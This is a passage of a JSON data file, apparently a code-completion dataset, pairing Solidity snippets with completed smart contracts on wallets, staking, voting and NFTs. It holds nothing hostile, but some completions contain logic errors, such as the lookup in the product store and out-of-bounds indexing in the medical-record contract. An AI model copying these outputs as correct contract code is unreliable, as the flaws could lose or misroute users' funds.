        "input": "function saveWalletData(uint _qty , string calldata _name) public{\n    wallet[_name] = _qty;\n}\n\nfunction consultarWallet(string calldata _name) public view returns(uint){\n    return wallet[_name];\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Wallet {\n\n    mapping (string => uint) wallet;\n\n    function saveWalletData(uint _qty , string calldata _name) public{\n        wallet[_name] = _qty;\n    }\n\n    function consultarWallet(string calldata _name) public view returns(uint){\n        return wallet[_name];\n    }\n\n}\n\n",
        "changed": 0
    },
    "483.sol": {
        "input": "import \"contractYouWantToInteractWith.sol\";\n\ncontract Interact {\n    contractYouWantToInteractWith public contract = contractYouWantToInteractWith(addressOfTheContract);\n\n\n    function interact() public {\n        contract.FUNCTIONFROMTHECONTRACT(inputs);\n    }\n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "484.sol": {
        "input": "import \"../interfaces/IERC20.sol\";\n\nfunction stakeTokens(uint256 _amount,address _token) public{\n    IERC20(_token).transferFrom(msg.sender,address(this),_amount);\n }\n\n\n",
        "output": "",
        "changed": 0
    },
    "485.sol": {
        "input": "function mint() public payable {\n    require(msg.value == 1e18);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public totalSupply;\n    mapping(address => uint256) public balances;\n\n    event Minted(address indexed _to, uint256 _value);\n\n    function mint() public payable {\n        require(msg.value == 1e18, \"Must send 1 Ether\");\n\n        totalSupply += msg.value;\n        balances[msg.sender] += msg.value;\n\n        emit Minted(msg.sender, msg.value);\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n}\n\n",
        "changed": 1
    },
    "486.sol": {
        "input": "pragma solidity ^0.8;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ncontract MyContract {\n    function batchTransfer(address token1, address token2, address from, address to, uint256 amount) public {\n        bool success1 = IERC20(token1).transferFrom(from, to, amount);\n        bool success2 = IERC20(token2).transferFrom(from, to, amount);\n    }\n}\n\n\n",
        "output": "",
        "changed": 1
    },
    "487.sol": {
        "input": "function addStaker() public payable {\n    require(msg.value == 1 ether);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract StakerContract {\n    address payable public owner;\n    mapping(address => bool) public stakers;\n\n    event StakerAdded(address indexed staker, uint amount);\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function addStaker() public payable {\n        require(msg.value == 1 ether, \"Send 1 Ether to become a staker\");\n\n        stakers[msg.sender] = true;\n\n        emit StakerAdded(msg.sender, msg.value);\n    }\n\n    function isStaker(address _address) public view returns(bool) {\n        return stakers[_address];\n    }\n\n    function withdraw() public {\n        require(msg.sender == owner, \"Only the owner can withdraw funds\");\n        owner.transfer(address(this).balance);\n    }\n}\n\n",
        "changed": 0
    },
    "488.sol": {
        "input": "require('condition', 'error msg');\n\nrequire(voting_status == VOTE_STATUS.CLOSED,\"Voting hasn't opened yet\");\n\nrequire(voting_status == VOTE_STATUS.OPEN,\"Voting hasn't opened yet\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract VotingContract {\n    enum VOTE_STATUS { OPEN, CLOSED }\n\n    VOTE_STATUS public voting_status;\n\n    constructor() public {\n        voting_status = VOTE_STATUS.CLOSED;\n    }\n\n    modifier onlyWhenOpen() {\n        require(voting_status == VOTE_STATUS.OPEN, \"Voting hasn't opened yet\");\n        _;\n    }\n\n    modifier onlyWhenClosed() {\n        require(voting_status == VOTE_STATUS.CLOSED, \"Voting hasn't opened yet\");\n        _;\n    }\n\n    function openVoting() public onlyWhenClosed {\n        voting_status = VOTE_STATUS.OPEN;\n    }\n\n    function closeVoting() public onlyWhenOpen {\n        voting_status = VOTE_STATUS.CLOSED;\n    }\n\n    function vote(uint _voteIndex) public onlyWhenOpen {\n        // Add your voting logic here\n    }\n}\n\n",
        "changed": 0
    },
    "489.sol": {
        "input": "constructor(){\n  owner = msg.sender;\n}\n\nrequire(owner == address(msg.sender);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleContract {\n    address public owner;\n    \n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function checkOwner() public view returns(bool) {\n        if (owner == address(msg.sender)) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "490.sol": {
        "input": "\n\nfunction tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        _requireMinted(tokenId);\n\n        string memory baseURI = _baseURI();\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, Strings.toString(tokenId),\".json\")) : \"\";\n    }```\n\n\n",
        "output": "",
        "changed": 0
    },
    "491.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256[] array = [100, 200, 300, 400, 500];\n\n    function remove(uint256 index) external {\n        require(array.length > index, \"Out of bounds\");\n        for (uint256 i = index; i < array.length - 1; i++) {\n            array[i] = array[i+1];\n        }\n        array.pop(); \n    }\n\n    function getArray() external view returns (uint256[] memory) {\n        return array;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    uint256[] array = [100, 200, 300, 400, 500];\n\n    function remove(uint256 index) external {\n        require(array.length > index, \"Out of bounds\");\n        // move all elements to the left, starting from the `index + 1`\n        for (uint256 i = index; i < array.length - 1; i++) {\n            array[i] = array[i+1];\n        }\n        array.pop(); // delete the last item\n    }\n\n    function getArray() external view returns (uint256[] memory) {\n        return array;\n    }\n}\n\n",
        "changed": 0
    },
    "492.sol": {
        "input": "function checkInventory() public view returns (uint256[] memory) {\n        require(owns[msg.sender].length != 0, \"Inventory is empty\");\n        uint256[] memory inventory = new uint256[](owns[msg.sender].length); \n        for (uint256 i = 0; i < owns[msg.sender].length; i++) {\n            inventory[i] = owns[msg.sender][i];\n        }\n        return (inventory);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Inventory {\n    mapping(address => uint256[]) private owns;\n\n    function addInventoryItem(uint256 itemId) public {\n        owns[msg.sender].push(itemId);\n    }\n\n    function checkInventory() public view returns (uint256[] memory) {\n        require(owns[msg.sender].length != 0, \"Inventory is empty\");\n        uint256[] memory inventory = new uint256[](owns[msg.sender].length); \n        for (uint256 i = 0; i < owns[msg.sender].length; i++) {\n            inventory[i] = owns[msg.sender][i];\n        }\n        return (inventory);\n    }\n}\n\n",
        "changed": 0
    },
    "493.sol": {
        "input": "  function getRecordByAddressMap(address _patientAddress) public view returns (Records[] memory){\n    Records[] memory rec = new Records[](recordID);\n      for (uint i = 1; i <= rec.length; i++) {\n        if (_patientAddress == records[i][_patientAddress].patient == true) {\n          rec[i] = records[i][_patientAddress];\n          } else {\n            continue;\n          }\n      }\n    return rec;\n  }\n\n  function getRecordByAddressStruct(address _patientAddress) public returns(Records[] memory) {\n    Records[] storage _getstructs = getstructs;\n    for (uint i = 1; i < _getstructs.length; i++) {\n      if (_patientAddress == recordsarray[i].patient == true) {\n        Records memory newRecord = Records({\n          patient: recordsarray[i].patient,\n          hospital: recordsarray[i].hospital,\n          admissionDate: recordsarray[i].admissionDate,\n          dischargeDate: recordsarray[i].dischargeDate,\n          visitReason: recordsarray[i].visitReason\n        });\n        _getstructs.push(newRecord);\n        } else {\n          continue;\n        }\n    }\n    return _getstructs;\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MedicalRecord {\n    struct Records {\n        address patient;\n        address hospital;\n        uint admissionDate;\n        uint dischargeDate;\n        string visitReason;\n    }\n\n    uint public recordID;\n    mapping(uint => mapping(address => Records)) public records;\n    Records[] public recordsarray;\n    \n    function getRecordByAddressMap(address _patientAddress) public view returns (Records[] memory){\n        Records[] memory rec = new Records[](recordID);\n        for (uint i = 1; i <= rec.length; i++) {\n            if (_patientAddress == records[i][_patientAddress].patient) {\n                rec[i] = records[i][_patientAddress];\n            } \n        }\n        return rec;\n    }\n\n    function getRecordByAddressStruct(address _patientAddress) public returns(Records[] memory) {\n        Records[] memory _getstructs = new Records[](recordID);\n        for (uint i = 0; i < recordsarray.length; i++) {\n            if (_patientAddress == recordsarray[i].patient) {\n                Records memory newRecord = Records({\n                    patient: recordsarray[i].patient,\n                    hospital: recordsarray[i].hospital,\n                    admissionDate: recordsarray[i].admissionDate,\n                    dischargeDate: recordsarray[i].dischargeDate,\n                    visitReason: recordsarray[i].visitReason\n                });\n                _getstructs[i] = newRecord;\n            }\n        }\n        return _getstructs;\n    }\n}\n\n",
        "changed": 0
    },
    "494.sol": {
        "input": "function subscribe(uint planId) external payable {\n    require(msg.value == 1 ether, \"You need to send 1 ETH\");\n}\n\nawait window.ethereum.request(\n    method: 'eth_sendTransaction',\n    [\n        from: userAddress,\n        to: yourContract,\n        data: <invoking the subscribe() function>,\n        value: <1 ETH in wei, in hex>\n    ]\n);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SubscriptionContract {\n    mapping(address => uint) public subscribers;\n\n    function subscribe(uint planId) external payable {\n        require(msg.value == 1 ether, \"You need to send 1 ETH\");\n        subscribers[msg.sender] = planId;\n    }\n}\n\n",
        "changed": 0
    },
    "495.sol": {
        "input": "import \"@chainlink/contracts/src/v0.7/Operator.sol\";\n\n\n",
        "output": "",
        "changed": 0
    },
    "496.sol": {
        "input": "function buy() external payable {\n    uint256 amount = calculateAmount(msg.value);\n\n    transfer(msg.sender, amount);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleToken {\n    mapping(address => uint256) public balances;\n\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\n\n    constructor() public {\n        balances[msg.sender] = 1000000;\n    }\n\n    function calculateAmount(uint256 _value) public pure returns (uint256) {\n        return _value * 100;\n    }\n\n    function buy() external payable {\n        uint256 amount = calculateAmount(msg.value);\n\n        transfer(msg.sender, amount);\n    }\n\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        require(balances[msg.sender] >= _value);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        emit Transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint256 balance) {\n        return balances[_owner];\n    }\n}\n\n",
        "changed": 1
    },
    "497.sol": {
        "input": "\npragma solidity ^0.8.0;\n\ncontract example{\n\nstruct Input{\n    uint256 gettid;\n    string title1;\n    string title2;\n    string title3;\n    string title4;\n    string title5;\n}\nInput[] public inputsArray;\n\nfunction gettid() public view returns(uint256) {\nreturn inputsArray.length;\n}\n\nfunction addinput(\n    string memory _title1,\n    string memory _title2,\n    string memory _title3,\n    string memory _title4,\n    string memory _title5\n    \n) public {\n    uint256 _nextId = gettid();\n    inputsArray.push(Thread(_nextId, _title1, _title2, _title3, _title4, _title5));\n}}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Example {\n    struct Input{\n        uint256 gettid;\n        string title1;\n        string title2;\n        string title3;\n        string title4;\n        string title5;\n    }\n    Input[] public inputsArray;\n\n    function gettid() public view returns(uint256) {\n        return inputsArray.length;\n    }\n\n    function addinput(\n        string memory _title1,\n        string memory _title2,\n        string memory _title3,\n        string memory _title4,\n        string memory _title5\n    ) \n    public {\n        uint256 _nextId = gettid();\n        inputsArray.push(Input(_nextId, _title1, _title2, _title3, _title4, _title5));\n    }\n} \n\n",
        "changed": 0
    },
    "499.sol": {
        "input": "pragma solidity ^0.4.26;\n\ncontract PrimeNumber{\n    function isPrimeNumber(uint num1) public view returns(bool) {\n        bool result = true;\n        assembly{\n            for {let i := 2} lt(i, num1) {i := add(i, 1)}{\n                if eq(mod(num1, i), 0) {\n                    result := 0\n                }\n            }\n        }\n        return result;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract PrimeNumber {\n    function isPrimeNumber(uint num1) public view returns(bool) {\n        bool result = true;\n        assembly{\n            for {let i := 2} lt(i, num1) {i := add(i, 1)}{\n                if eq(mod(num1, i), 0) {\n                    result := 0\n                }\n            }\n        }\n        return result;\n    }\n}\n\n",
        "changed": 0
    },
    "500.sol": {
        "input": " Listing[] storage userItems = userListings[msg.sender]\n\nfor(uint256 i=0; i<userItems.length; i++){\n\n   if userItems[i].listingId==listingId{\n      userItems[i].status=ListingStatus.Cancelled,\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ItemsListing {\n    enum ListingStatus { Active, Cancelled }\n\n    struct Listing {\n        uint256 listingId;\n        ListingStatus status;\n    }\n    \n    mapping(address => Listing[]) public userListings;\n\n    function cancelListing(uint256 listingId) public {\n        Listing[] storage userItems = userListings[msg.sender];\n\n        for(uint256 i = 0; i < userItems.length; i++) {\n            if (userItems[i].listingId == listingId) {\n                userItems[i].status = ListingStatus.Cancelled;\n            }\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "501.sol": {
        "input": "contract A {\n    function X() external virtual returns (uint256) {\n        return 1;\n    }\n}\n\ncontract B is A {\n    uint256 public constant override X = 2;\n}\n\ncontract A {\n    uint256 public immutable X;\n\n    constructor(uint256 _x) {\n        X = _x;\n    }\n}\n\ncontract B is A(2) {}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract A {\n    uint256 public immutable X;\n\n    constructor(uint256 _x) {\n        X = _x;\n    }\n}\n\n",
        "changed": 0
    },
    "502.sol": {
        "input": "ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);\n\nnew ProxyRegistry(<constructor_params>);\n\nif (address(proxyRegistry.proxies(owner)) == operator) {\n    return true;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ProxyRegistry {\n    mapping(address => address) public proxies;\n\n    constructor() public {}\n\n    function createProxy(address owner) public returns (address proxy) {\n        proxy = address(new Proxy(owner));\n        proxies[owner] = proxy;\n    }\n}\n\ncontract Proxy {\n    address public owner;\n\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n}\n\ncontract YourContract {\n    ProxyRegistry proxyRegistry;\n\n    constructor(address proxyRegistryAddress) public {\n        proxyRegistry = ProxyRegistry(proxyRegistryAddress);\n    }\n\n    function checkOperator(address owner, address operator) public view returns (bool) {\n        if (address(proxyRegistry.proxies(owner)) == operator) {\n            return true;\n        }\n        return false;\n    }\n}\n\n",
        "changed": 0
    },
    "503.sol": {
        "input": "require(arrayOne.length == arrayTwo.length)\nfor (i; arrayOne.length > i; i++) {\n    arrayOne[i] = ....;\n    arrayTwo[i] = ....;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ArrayManipulator {\n    uint[] public arrayOne;\n    uint[] public arrayTwo;\n\n    function setArrays(uint[] memory _arrayOne, uint[] memory _arrayTwo) public {\n        require(_arrayOne.length == _arrayTwo.length, \"Array lengths must be equal\");\n        arrayOne = _arrayOne;\n        arrayTwo = _arrayTwo;\n    }\n\n    function manipulateArrays(uint _valueOne, uint _valueTwo) public {\n        require(arrayOne.length == arrayTwo.length, \"Array lengths must be equal\");\n        \n        // Loop through each element in the arrays\n        for (uint i = 0; i < arrayOne.length; i++) {\n            arrayOne[i] = _valueOne;\n            arrayTwo[i] = _valueTwo;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "504.sol": {
        "input": "mapping (address => mapping (address => uint256)) public userCollectionToken;\n\nfunction store(address _user, address _collection, uint256 _tokenId) external {\n    userCollectionToken[_user][_collection] = _tokenId;\n}\n\nstruct NFT {\n    address collection;\n    uint256 tokenID;\n}\n\nmapping (address => NFT) public userNFT;\n\nfunction store(address _user, address _collection, uint256 _tokenId) external {\n    userNFT[_user] = NFT(_collection, _tokenId);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NFTStorage {\n    mapping (address => mapping (address => uint256)) public userCollectionToken;\n\n    function storeUserCollectionToken(address _user, address _collection, uint256 _tokenId) external {\n        userCollectionToken[_user][_collection] = _tokenId;\n    }\n\n    struct NFT {\n        address collection;\n        uint256 tokenID;\n    }\n\n    mapping (address => NFT) public userNFT;\n\n    function storeUserNFT(address _user, address _collection, uint256 _tokenId) external {\n        userNFT[_user] = NFT(_collection, _tokenId);\n    }\n}\n\n",
        "changed": 0
    },
    "505.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address payable[] public bidders;\n    mapping (address => bool) isBidder; \n\n    function placeBid() public {\n        if (isBidder[msg.sender] == false) {\n            bidders.push(payable(msg.sender));\n            isBidder[msg.sender] = true;\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    address payable[] public bidders;\n    mapping (address => bool) isBidder; // default `false`\n\n    // only add `msg.sender` to `bidders` if it's not there yet\n    function placeBid() public {\n        // check against the mapping\n        if (isBidder[msg.sender] == false) {\n            // push the unique item to the array\n            bidders.push(payable(msg.sender));\n            // don't forget to set the mapping value as well\n            isBidder[msg.sender] = true;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "506.sol": {
        "input": "require(condition, error message);\n\nrequire(attrExists, \"no such attrib\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n\n    mapping (string => bool) public attrs;\n\n    function validateAttr(string memory attrName) public view {\n        bool attrExists = attrs[attrName];\n        require(attrExists, \"no such attrib\");\n    }\n\n    function addAttr(string memory attrName) public {\n        attrs[attrName] = true;\n    }\n}\n\n",
        "changed": 0
    },
    "507.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract Sender {\n    Receiver receiver;\n\n    constructor(address payable _receiver) {\n        receiver = Receiver(_receiver);\n    }\n\n    function sendWithData() external payable {\n        bytes memory sendData = abi.encode(\"hello\");\n        (bool success,) = address(receiver).call{value: msg.value}(sendData);\n        require(success);\n    }\n}\n\ncontract Receiver {\n    event Received(bytes, uint256);\n\n    fallback(bytes calldata receivedData) external payable returns (bytes memory) {\n        emit Received(receivedData, msg.value);\n        return \"\";\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract Sender {\n    Receiver receiver;\n\n    constructor(address payable _receiver) {\n        receiver = Receiver(_receiver);\n    }\n\n    function sendWithData() external payable {\n        bytes memory sendData = abi.encode(\"hello\");\n        (bool success,) = address(receiver).call{value: msg.value}(sendData);\n        require(success);\n    }\n}\n\ncontract Receiver {\n    event Received(bytes, uint256);\n\n    fallback(bytes calldata receivedData) external payable returns (bytes memory) {\n        emit Received(receivedData, msg.value);\n        return \"\";\n    }\n}\n\n",
        "changed": 0
    },
    "508.sol": {
        "input": "function slice(\n  uint256 start,\n  uint256 end,\n  uint256[] memory proposals\n) public pure returns (uint256[] memory) {\n  uint256[] memory result;\n\n  uint256 idx = 0;\n\n  for (uint256 i = start; i < end; i++) {\n      result[idx] = proposals[i];\n      idx++;\n  }\n\n  return result;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Slice {\n    function slice(\n      uint256 start,\n      uint256 end,\n      uint256[] memory proposals\n    ) public pure returns (uint256[] memory) {\n      require(start <= end && end <= proposals.length, \"Invalid start or end indices\");\n      uint256[] memory result = new uint256[](end - start);\n\n      uint256 idx = 0;\n\n      for (uint256 i = start; i < end; i++) {\n          result[idx] = proposals[i];\n          idx++;\n      }\n\n      return result;\n    }\n}\n\n",
        "changed": 0
    },
    "509.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract test{\n    mapping(address=> mapping(uint => uint)) public address_id_liked;\n\n    function register(uint id) external{ \n        address_id_liked[msg.sender][id] = 1;\n    }\n\n    function test_(uint index) external view returns(uint) {\n        uint out = address_id_liked[msg.sender][index];\n        return(out);\n    }\n\n    function ops(uint id, uint num) external {\n        address_id_liked[msg.sender][id] = num;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.0;\n\ncontract test{\n    mapping(address=> mapping(uint => uint)) public address_id_liked;\n\n    function register(uint id) external{ \n        address_id_liked[msg.sender][id] = 1;\n    }\n\n    function test_(uint index) external view returns(uint) {\n        uint out = address_id_liked[msg.sender][index];\n        return(out);\n    }\n\n    function ops(uint id, uint num) external {\n        address_id_liked[msg.sender][id] = num;\n    }\n}\n\n",
        "changed": 0
    },
    "510.sol": {
        "input": "pragma solidity ^0.8.2;\nimport \"./IAnotherContract.sol\";\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\ncontract AnotherContract is IAnotherContract {\n    function doSomethingIfBalanceIsEnough()\n      external\n      returns (string memory)\n    {\n        uint256 userBalance = IERC20(myTokenAddress).balanceOf(msg.sender);\n        if (userBalance > 0) {\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n}\n\n",
        "changed": 1
    },
    "511.sol": {
        "input": "...\nfunction totalSupply() public constant returns (uint) {\n    if (deprecated) {\n        return StandardToken(upgradedAddress).totalSupply();\n    } else {\n        return _totalSupply;\n    }\n}\n...\n\nfunction issue(uint amount) public onlyOwner {\n    require(_totalSupply + amount > _totalSupply);\n    require(balances[owner] + amount > balances[owner]);\n\n    balances[owner] += amount;\n    _totalSupply += amount;\n    Issue(amount);\n}\n\nfunction redeem(uint amount) public onlyOwner {\n    require(_totalSupply >= amount);\n    require(balances[owner] >= amount);\n\n    _totalSupply -= amount;\n    balances[owner] -= amount;\n    Redeem(amount);\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract StandardToken {\n    function totalSupply() public view returns (uint);\n}\n\ncontract MyToken {\n    address public owner;\n    bool public deprecated;\n    address public upgradedAddress;\n    mapping (address => uint256) public balances;\n    uint256 public _totalSupply;\n    \n    event Issue(uint amount);\n    event Redeem(uint amount);\n\n    constructor() public {\n        owner = msg.sender;\n        _totalSupply = 10000;\n        balances[owner] = _totalSupply;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner);\n        _;\n    }\n\n    function totalSupply() public view returns (uint) {\n        if (deprecated) {\n            return StandardToken(upgradedAddress).totalSupply();\n        } else {\n            return _totalSupply;\n        }\n    }\n\n    function issue(uint amount) public onlyOwner {\n        require(_totalSupply + amount > _totalSupply);\n        require(balances[owner] + amount > balances[owner]);\n\n        balances[owner] += amount;\n        _totalSupply += amount;\n        emit Issue(amount);\n    }\n\n    function redeem(uint amount) public onlyOwner {\n        require(_totalSupply >= amount);\n        require(balances[owner] >= amount);\n\n        _totalSupply -= amount;\n        balances[owner] -= amount;\n        emit Redeem(amount);\n    }\n}\n\n",
        "changed": 1
    },
    "512.sol": {
        "input": "constructor(string memory name, string memory symbol) ERC20(name, symbol) payable {\n    _mint(msg.sender, 1000000 * 10 ** 18);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "513.sol": {
        "input": "interface ERC20 {\n    function transferFrom(\n        address _from,\n        address _to,\n        uint256 _value\n    ) internal {}\n}\n\ncontract ERC1155 {\n    ERC20 erc20Contract = ERC20(0x1234...5678);\n\n    function buyNFT(uint256 price)\n        external\n    {\n        erc20Contract.transferFrom(msg.sender, price);\n\n       _mint(msg.sender, tokenId, quantity);\n    }\n\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);\n}\n\ncontract ERC1155 {\n    ERC20 erc20Contract;\n    mapping(uint256 => address) public tokenOwners;\n    mapping(uint256 => uint256) public tokenBalances;\n\n    constructor(address _erc20Address) public {\n        erc20Contract = ERC20(_erc20Address);\n    }\n\n    function buyNFT(uint256 price, uint256 tokenId, uint256 quantity) external {\n        require(erc20Contract.transferFrom(msg.sender, address(this), price), \"Transfer of ERC20 failed\");\n        _mint(msg.sender, tokenId, quantity);\n    }\n\n    function _mint(address to, uint256 tokenId, uint256 quantity) internal {\n        tokenOwners[tokenId] = to;\n        tokenBalances[tokenId] += quantity;\n    }\n\n    function balanceOf(uint256 tokenId) public view returns (uint256) {\n        return tokenBalances[tokenId];\n    }\n\n    function ownerOf(uint256 tokenId) public view returns (address) {\n        return tokenOwners[tokenId];\n    }\n}\n\n",
        "changed": 1
    },
    "514.sol": {
        "input": "    function withdraw() public payable {    \n        address recipient = msg.sender;\n        uint256 additionalToken;\n\n        if (ethPrice <= 2000) {    \n            additionalToken = lockAmounts[msg.sender] * 2;\n        }\n\n        require(block.timestamp >= deadline);\n        uint256 amountToWithdraw = lockAmounts[msg.sender] + additionalToken;\n        lockAmounts[msg.sender] = 0; \n        (bool success, ) = payable(recipient).call{value: amountToWithdraw}(\"\");\n        require(success, \"Transfer failed.\"); \n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    mapping(address => uint256) public lockAmounts;\n    uint256 public deadline;\n    uint256 public ethPrice;\n\n    constructor(uint256 _deadline, uint256 _ethPrice) {\n        deadline = _deadline;\n        ethPrice = _ethPrice;\n    }\n    \n    function deposit() public payable {\n        require(msg.value > 0, \"Deposit must be greater than 0.\");\n        lockAmounts[msg.sender] += msg.value;\n    }\n    \n    function withdraw() public payable {    \n        address recipient = msg.sender;\n        uint256 additionalToken = 0;\n\n        if (ethPrice <= 2000) {    \n            additionalToken = lockAmounts[msg.sender] * 2;\n        }\n\n        require(block.timestamp >= deadline, \"Deadline not reached.\");\n        \n        uint256 amountToWithdraw = lockAmounts[msg.sender] + additionalToken;\n        require(amountToWithdraw <= address(this).balance, \"Contract does not have enough funds.\");\n        \n        lockAmounts[msg.sender] = 0; \n        (bool success, ) = payable(recipient).call{value: amountToWithdraw}(\"\");\n        require(success, \"Transfer failed.\"); \n    }\n\n    function setEthPrice(uint256 _ethPrice) public {\n        ethPrice = _ethPrice;\n    }\n}\n\n",
        "changed": 0
    },
    "515.sol": {
        "input": "contract A {\n    function getBValue() external returns (uint256) {\n        uint256 BValue = B(address(0x123)).getValue();\n        return BValue;\n    }\n}\n\ncontract B {\n    function getValue() external returns (uint256) {\n        return 1;\n    }\n}\n\ncontract A {\n    function getBValue() external view returns (uint256) {\n        uint256 BValue = B(address(0x123)).getValue();\n        return BValue;\n    }\n}\n\ncontract B {\n    function getValue() external view returns (uint256) {\n        return 1;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract B {\n    function getValue() external pure returns (uint256) {\n        return 1;\n    }\n}\n\ncontract A {\n    B b;\n    \n    constructor() public {\n        b = new B();\n    }\n\n    function getBValue() external view returns (uint256) {\n        uint256 BValue = b.getValue();\n        return BValue;\n    }\n}\n",
        "changed": 0
    },
    "517.sol": {
        "input": "address payable private owner;\nconstructor(){\n   owner=payable(msg.sender)\n}\n\nfunction withdraw() public {\n       require(msg.sender==owner,\"only contract owner can call this\");\n       owner.transfer(address(this).balance);\n    }\n\nfunction withdraw() public {\n           require(msg.sender==owner,\"only contract owner can call this\");\n           (bool success, ) = owner.call{value:address(this).balance}(\"\");\n           require(success,\"Withdraw failed\")\n        }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address payable private owner;\n    \n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    function withdrawWithTransfer() public {\n        require(msg.sender == owner, \"only contract owner can call this\");\n        owner.transfer(address(this).balance);\n    }\n\n    function withdrawWithCall() public {\n        require(msg.sender == owner, \"only contract owner can call this\");\n        (bool success, ) = owner.call{value: address(this).balance}(\"\");\n        require(success, \"Withdraw failed\");\n    }\n}\n\n",
        "changed": 0
    },
    "518.sol": {
        "input": "function addProduct(uint id,  uint quantity) public {\n    for (uint i; i < store.length; i++) {\n        if (store[i].id == id) {\n            store[i].quantity += quantity;\n            return;\n        }\n    }\n\n    store.push(Store(id, quantity));\n}\n\nmapping (uint => uint) productIdToArrayIndex;\n\nfunction addProduct(uint id,  uint quantity) public {\n    uint arrayIndex = productIdToArrayIndex[id];\n    if (arrayIndex > 0) {\n        store[arrayIndex].quantity += quantity;\n    }\n\n    store.push(Store(id, quantity));\n    productIdToArrayIndex[id] = store.length - 1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Store {\n    struct Product {\n        uint id;\n        uint quantity;\n    }\n    \n    Product[] public store;\n    mapping (uint => uint) productIdToArrayIndex;\n\n    function addProduct(uint id,  uint quantity) public {\n        uint arrayIndex = productIdToArrayIndex[id];\n        if (arrayIndex > 0) {\n            store[arrayIndex].quantity += quantity;\n        } else {\n            store.push(Product(id, quantity));\n            productIdToArrayIndex[id] = store.length - 1;\n        }\n    }\n\n    function getProductQuantity(uint id) public view returns (uint) {\n        uint arrayIndex = productIdToArrayIndex[id];\n        return store[arrayIndex].quantity;\n    }\n}\n\n",
        "changed": 0
    },
    "519.sol": {
        "input": " Zombie[] public zombies;\n\nfunction createZombie (string memory _name, uint _dna) public {\n        Zombie storage firstZombie=zombies[0]\n        firstZombie.name=_name\n    }\n\nfunction createZombie (string memory _name, uint _dna) public {\n            Zombie memory firstZombie=zombies[0]\n            firstZombie.name=_name\n            return firstZombie\n        }\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ZombieFactory {\n\n    event NewZombie(uint zombieId, string name, uint dna);\n\n    uint dnaDigits = 16;\n    uint dnaModulus = 10 ** dnaDigits;\n\n    struct Zombie {\n        string name;\n        uint dna;\n    }\n\n    Zombie[] public zombies;\n\n    function _createZombie(string memory _name, uint _dna) internal {\n        uint id = zombies.push(Zombie(_name, _dna)) - 1;\n        emit NewZombie(id, _name, _dna);\n    }\n\n    function createZombie(string memory _name, uint _dna) public {\n        require(_dna < dnaModulus, \"DNA should be less than dnaModulus\");\n        _createZombie(_name, _dna);\n    }\n}\n\n",
        "changed": 0
    },
    "520.sol": {
        "input": " mapping(bytes => bool) private _supportedInterfaces;\n\nmapping(bytes4 => bool) private _supportedInterfaces;\n\n\n",
